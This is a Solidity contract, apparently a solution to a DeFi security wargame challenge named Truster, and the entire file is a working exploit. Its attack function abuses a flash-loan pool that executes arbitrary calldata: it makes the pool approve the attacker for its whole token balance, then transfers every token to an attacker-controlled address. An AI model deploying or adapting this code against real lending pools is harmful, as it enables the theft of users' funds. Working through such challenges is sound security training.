// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ITrusterPool{
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract TrusterAttack{
    using Address for address payable;

    IERC20 token;
    ITrusterPool pool;
    address attackerEOA;

    constructor(
        IERC20 _token,
        ITrusterPool _pool,
        address _attackerEOA
    ) {
        token = _token;
        pool = _pool;
        attackerEOA = _attackerEOA;
    }

    function attack() external {
        //get pool balance
        uint256 _poolBal = token.balanceOf(address(pool));

        //call flashLoan
        pool.flashLoan(
            0, 
            attackerEOA, 
            address(token), 
            abi.encodeWithSignature("approve(address,uint256)", address(this), _poolBal)
        );
        
        //transfer tokens to attackerEOA
        token.transferFrom(address(pool), attackerEOA, _poolBal);
    }
}